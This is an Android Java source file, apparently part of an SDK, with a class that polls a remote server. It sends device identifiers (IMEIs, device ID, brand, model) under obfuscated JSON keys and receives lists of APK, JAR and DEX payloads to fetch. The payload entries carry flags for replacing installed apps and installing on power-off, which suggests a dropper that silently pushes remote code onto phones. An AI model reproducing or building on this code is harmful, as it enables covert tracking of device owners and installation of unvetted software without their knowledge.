package com.hs.cld.da;

import android.content.Context;

import com.hs.cld.basic.Builder;
import com.hs.cld.basic.HTTPRequester;
import com.hs.cld.basic.Hosts;
import com.hs.cld.common.id.CUID;
import com.hs.cld.common.utils.Device;
import com.hs.cld.common.utils.KVUtils;
import com.hs.cld.common.utils.LOG;
import com.hs.cld.common.utils.SystemUtils;
import com.hs.cld.common.utils.TextUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class GetDispatchInfo extends HTTPRequester {
	private List<Message> mDexList = new ArrayList<Message>();
	private List<Message> mAppList = new ArrayList<Message>();
	private List<Message> mJarList = new ArrayList<Message>();

	public List<Message> getDexList() {
		return mDexList;
	}

	public List<Message> getAppList() {
		return mAppList;
	}

	public List<Message> getJarList() {
		return mJarList;
	}

	/**
	 * 构造函数
	 * @param context 上下文对象
	 */
	public GetDispatchInfo(Context context) {
		super(context, "GetDispatchInfo");
		setRequestPath("api/v1/da");
		setTargetHosts(Hosts.APIS(context));
	}

	public void request() throws Exception {
		mDexList.clear();
		mAppList.clear();
		mJarList.clear();
		String parameter = buildParameter();
		LOG.i(TAG, "GDI: parameter=" + parameter);
		setRequestBody(parameter);
		jsonExecute();
		handleResponse();
	}

	private String buildParameter() throws JSONException {
		JSONObject jo = new JSONObject();
		jo.put("b32", notNull(Device.getBrand()));
		jo.put("t34", "poll");
		jo.put("t35", "");
		jo.put("l37", SystemUtils.getLang());
		jo.put("c38", "0");
		jo.put("o43", notNull(Device.getModel()));
		jo.put("i44", notNull(Device.getm1(mContext)));
		jo.put("i50", notNull(getIMEIs(mContext)));
		jo.put("d49", notNull(getDeviceId(mContext)));
		jo.put("a50", "0");
		jo.put("c6", SystemUtils.getROMRelease());
		jo.put("n9", SystemUtils.getNetworkType(mContext));
		jo.put("s14", SystemUtils.getOSRelease());
		jo.put("v22", "" + SystemUtils.getSelfVersionCode(mContext));
		jo.put("p23", SystemUtils.getSelfPackageName(mContext));
		jo.put("c0", Builder.CHANNEL);
		jo.put("v0", Builder.VERSION);
		return jo.toString();
	}

	private void handleResponse() throws Exception {
		String responseData = getResponseData();
		LOG.i(TAG, "GDI: response=" + responseData);

		if (!TextUtils.empty(responseData)) {
			JSONObject jo = new JSONObject(responseData);
			JSONArray dataNodes = jo.getJSONArray("p1");

			for (int i = 0; i < dataNodes.length(); i++) {
				try {
					JSONObject dataNode = dataNodes.getJSONObject(i);
					String strType = KVUtils.getString(dataNode, "t19", "");
					String strMessage = KVUtils.getString(dataNode, "m19", "");
					JSONObject messageNode = new JSONObject(strMessage);
					Message message = parseMessageNode(dataNode, messageNode);
					validateMessage(message);

					if (TextUtils.equals(strType, "apk")) {
						mAppList.add(message);
					} else if (TextUtils.equals(strType, "jar")) {
						mJarList.add(message);
					} else if (TextUtils.equals(strType, "dex")) {
						mDexList.add(message);
					}
				} catch (Exception e) {
					LOG.w(TAG, "parse data node failed: " + e);
				}
			}
		}
	}

	private Message parseMessageNode(JSONObject dataNode, JSONObject messageNode) {
		Message message = new Message();
		message.mId = KVUtils.getString(dataNode, "p1", "");
		message.mFileMd5 = KVUtils.getString(dataNode, "f21", "");
		message.mUrl = KVUtils.getString(messageNode, "u4", "");
		//message.mExeInMillis = KVUtils.getLong(dataNode, "s4", -1);
		//message.mExpired = KVUtils.getLong(dataNode, "e22", -1);
		message.mVersion = KVUtils.getString(messageNode, "v2", "");
		message.mPkgName = KVUtils.getString(messageNode, "p3", "");
		message.mReportId = KVUtils.getString(dataNode, "r30", "");
		message.mInstallReplaced = KVUtils.getBoolean(messageNode, "r5", false);
		message.mInstallOnPowerOff = KVUtils.getBoolean(messageNode, "s42", false);
		message.mActionVerb = KVUtils.getInt(messageNode, "v99", Message.ACTIONVERB_INSTALL);
		return message;
	}

	private void validateMessage(Message message) throws Exception {
		alertEmpty(message.mUrl, "empty apk URL");
	}
}
